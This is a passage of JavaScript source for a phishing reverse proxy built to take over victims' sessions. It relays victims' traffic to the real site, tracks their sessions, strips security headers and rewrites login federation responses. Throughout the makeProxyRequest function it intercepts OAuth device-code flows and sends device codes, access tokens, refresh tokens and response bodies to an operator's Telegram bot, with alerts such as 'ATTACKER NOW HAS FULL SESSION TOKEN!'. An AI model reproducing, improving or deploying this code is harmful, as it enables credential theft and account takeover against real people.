                displayError("Client request body retrieval failed", error, method, url);
            }).on("data", (chunk) => {
                clientRequestBody.push(chunk);
            }).on("end", () => {
                clientRequestBody = Buffer.concat(clientRequestBody).toString();

                if (!currentSession) {
                    // anonymous session handling...
                    if (clientRequestBody) {
                        try {
                            clientRequestBody = JSON.parse(clientRequestBody);
                            const proxyRequestURL = new URL(clientRequestBody.url);
                            const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                            if (proxyRequestURL.hostname === headers.host &&
                                proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                try {
                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                    clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                                    VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                    VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                    VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                    VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                    VICTIM_SESSIONS[cookieName].host = phishedURL.host;
                                    clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                    clientResponse.end();
                                } catch (error) {
                                    displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                }
                            } else {
                                clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                clientResponse.end();
                            }
                        } catch (error) {
                            displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                        }
                    } else {
                        clientResponse.writeHead(301, { Location: REDIRECT_URL });
                        clientResponse.end();
                    }
                } else {
                    // Authenticated session
                    let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                    const proxyRequestOptions = {
                        hostname: VICTIM_SESSIONS[currentSession].hostname,
                        port: VICTIM_SESSIONS[currentSession].port,
                        method: method,
                        path: VICTIM_SESSIONS[currentSession].path,
                        headers: { ...headers },
                        rejectUnauthorized: false
                    };
                    let isNavigationRequest = false;

                    if (clientRequestBody) {
                        if (url === PROXY_PATHNAMES.jsCookie) {
                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                            clientResponse.end(JSON.stringify(validDomains));
                            return;
                        } else if (url === PROXY_PATHNAMES.proxy) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                let proxyRequestURL = new URL(clientRequestBody.url);
                                let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host) {
                                    if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                        try {
                                            const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                            VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                            VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                            VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                            VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                            VICTIM_SESSIONS[currentSession].host = phishedURL.host;
                                            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                            clientResponse.end();
                                        } catch (error) {
                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                        }
                                        return;
                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                        fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                        return;
                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                        try {
                                            const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                            proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                            proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                        } catch (error) {
                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                            return;
                                        }
                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                        clientResponse.end(JSON.stringify(validDomains));
                                        return;
                                    }
                                }
                                proxyRequestProtocol = proxyRequestURL.protocol;
                                proxyRequestOptions.path = proxyRequestPath;
                                proxyRequestOptions.port = proxyRequestURL.port;
                                proxyRequestOptions.method = clientRequestBody.method;
                                proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                if (proxyRequestURL.hostname !== headers.host) {
                                    proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                    proxyRequestOptions.headers.host = proxyRequestURL.host;
                                }
                                if (proxyRequestOptions.headers.referer) {
                                    proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                }
                                isNavigationRequest = clientRequestBody.mode === "navigate";
                            } catch (error) {
                                displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                            }
                        } else {
                            console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                        }
                    } else {
                        console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                    }

                    proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                    updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                    const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                    const requestContentLength = Buffer.byteLength(proxyRequestBody);
                    if (requestContentLength) {
                        proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                    } else {
                        delete proxyRequestOptions.headers["content-type"];
                        delete proxyRequestOptions.headers["content-length"];
                    }

                    if (isNavigationRequest) {
                        VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                        VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                        VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                        VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                        VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                    }

                    makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest, clientRequest);
                }
            });
        }
    } else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

proxyServer.listen(process.env.PORT ?? 3000);

// ==================== makeProxyRequest (FIXED + DEVICE CODE HOOKS) ====================
const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, clientRequest) => {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession, clientRequest)
            .catch(error => displayError("Log encryption failed", error));

        // === FIXED: Update session path on ALL redirects (300-399) ===
        if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
            const proxyResponseLocation = proxyResponse.headers.location;
            if (proxyResponseLocation) {
                try {
                    const locationURL = new URL(proxyResponseLocation);
                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
                    VICTIM_SESSIONS[currentSession].host = locationURL.host;
                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                } catch {
                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
                }
            }
        } else if (proxyResponse.statusCode > 400) {
            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
        }

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
        if (proxyResponseCookie) {
            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse.on("error", (error) => {
            displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
        }).on("data", (chunk) => {
            serverResponseBody.push(chunk);
        }).on("end", async () => {
            serverResponseBody = Buffer.concat(serverResponseBody);

            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                Buffer.byteLength(serverResponseBody)) {
                try {
                    const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                    serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
                    serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
                    if (proxyResponse.headers["content-length"]) {
                        proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                    }
                } catch (error) {
                    displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                }
            } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                try {
                    const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                    serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                    serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
                    if (proxyResponse.headers["content-length"]) {
                        proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                    }
                } catch (error) {
                    displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                }
            }

            // ==================== DEVICE CODE FLOW INTERCEPTION ====================
            // Intercept /devicecode response (initial code generation)
            if (proxyRequestOptions.path.includes('/oauth2/v2.0/devicecode')) {
                try {
                    const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                    const bodyString = decompressedResponseBody.toString('utf-8');
                    const json = JSON.parse(bodyString);
                    
                    const deviceCode = json.device_code;
                    const userCode = json.user_code;
                    const verificationUri = json.verification_uri;
                    const expiresIn = json.expires_in;
                    const interval = json.interval;

                    const deviceAlert = 
`📱 *DEVICE CODE FLOW DETECTED!*
🔑 *User Code:* \`${escapeMarkdown(userCode)}\`
🌐 *Verification URI:* ${escapeMarkdown(verificationUri)}
🕒 *Expires in:* ${expiresIn}s
⏱️ *Poll interval:* ${interval}s
🔐 *Device Code (for token exchange):* \`${escapeMarkdown(deviceCode)}\`

💡 *Action:* Send the user to ${verificationUri} and ask them to enter \`${userCode}\`. 
Then use the device_code to poll for the access token.`;

                    await queueTelegramLog(deviceAlert);
                    
                    serverResponseBody = await compressResponseBody(decompressedResponseBody, encodings);
                    if (proxyResponse.headers["content-length"]) {
                        proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                    }
                } catch (error) {
                    displayError("Device Code interception failed", error, proxyRequestOptions.path);
                }
            }

            // Intercept /token response (polling for token)
            if (proxyRequestOptions.path.includes('/oauth2/v2.0/token') && proxyRequestBody && proxyRequestBody.includes('device_code')) {
                try {
                    let bodyStr = proxyRequestBody.toString();
                    const params = new URLSearchParams(bodyStr);
                    const deviceCode = params.get('device_code');
                    const grantType = params.get('grant_type');

                    if (grantType === 'urn:ietf:params:oauth:grant-type:device_code' && deviceCode) {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        const tokenResponse = JSON.parse(decompressedResponseBody.toString('utf-8'));

                        if (tokenResponse.access_token) {
                            const tokenAlert = 
`🔓 *DEVICE CODE TOKEN GRANTED!*
🎟️ *Access Token:* \`${escapeMarkdown(tokenResponse.access_token)}\`
🔄 *Refresh Token:* \`${escapeMarkdown(tokenResponse.refresh_token || 'N/A')}\`
📅 *Expires in:* ${tokenResponse.expires_in}s
👤 *Scope:* ${tokenResponse.scope || 'N/A'}
🔑 *Used Device Code:* \`${escapeMarkdown(deviceCode)}\`

🔥 *ATTACKER NOW HAS FULL SESSION TOKEN!*`;
                            await queueTelegramLog(tokenAlert);
                        } else if (tokenResponse.error === 'authorization_pending') {
                            // Pending - optionally log
                        } else if (tokenResponse.error === 'slow_down') {
                            // Rate limiting - ignore
                        }
                        
                        serverResponseBody = await compressResponseBody(decompressedResponseBody, encodings);
                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                } catch (error) {
                    displayError("Token interception failed", error, proxyRequestOptions.path);
                }
            }

            // ---- INTELLIGENT RESPONSE SNIPPET (FILTERS BINARY) ----
            if (serverResponseBody && Buffer.byteLength(serverResponseBody) > 0) {
                const contentType = (proxyResponse.headers['content-type'] || '').toLowerCase();
                const contentEncoding = (proxyResponse.headers['content-encoding'] || '').toLowerCase();
                const isBinaryAsset = 
                    contentType.includes('image/') ||
                    contentType.includes('font/') ||
                    contentType.includes('application/javascript') ||
                    contentType.includes('text/css') ||
                    contentType.includes('application/octet-stream') ||
                    contentEncoding.includes('gzip') ||
                    contentEncoding.includes('br') ||
                    contentEncoding.includes('deflate') ||
                    contentType.includes('application/x-javascript');

                const sizeKB = (Buffer.byteLength(serverResponseBody) / 1024).toFixed(1);

                if (isBinaryAsset) {
                    const snippetMsg = `📦 *Binary asset (${contentType || 'unknown'})* — ${sizeKB} KB (skipped)`;
                    queueTelegramLog(snippetMsg).catch(e => displayError("Binary snippet Telegram error", e));
                } else {
                    let respStr = serverResponseBody.toString('utf-8', 0, Math.min(1500, Buffer.byteLength(serverResponseBody)));
                    if (Buffer.byteLength(serverResponseBody) > 1500) respStr += '... (truncated)';

                    if (contentType.includes('application/json')) {
                        try {
                            const jsonObj = JSON.parse(respStr);
                            respStr = JSON.stringify(jsonObj, null, 2);
                            const tokens = extractResponseTokens(jsonObj, contentType);
                            if (tokens) {
                                const tokenStr = Object.entries(tokens).map(([k, v]) => `🎟️ *${escapeMarkdown(k)}*: \`${escapeMarkdown(v)}\``).join("\n");
                                respStr += `\n\n🔥 *EXTRACTED RESPONSE TOKENS:*\n${tokenStr}`;
                            }
                        } catch (e) { /* keep raw */ }
                    }

                    const snippetMsg = `📤 *RESPONSE BODY (${contentType || 'text'}):*\n\`\`\`\n${escapeMarkdown(respStr)}\n\`\`\``;
                    queueTelegramLog(snippetMsg).catch(e => displayError("Text snippet Telegram error", e));
                }
            }

            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
            clientResponse.end(serverResponseBody);
        });
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
}

// ==================== GRACEFUL SHUTDOWN ====================
process.on("exit", () => {
    if (telegramBatch.length > 0) {
        flushTelegramBatch().catch(() => {});
    }
});
process.on("SIGINT", () => process.exit());
process.on("SIGTERM", () => process.exit());

console.log("🚀 Proxy server running on port", process.env.PORT ?? 3000);
console.log("📡 Telegram bot token:", TELEGRAM_BOT_TOKEN ? "set" : "NOT SET");
console.log("📡 Telegram chat ID:", TELEGRAM_CHAT_ID ? "set" : "NOT SET");
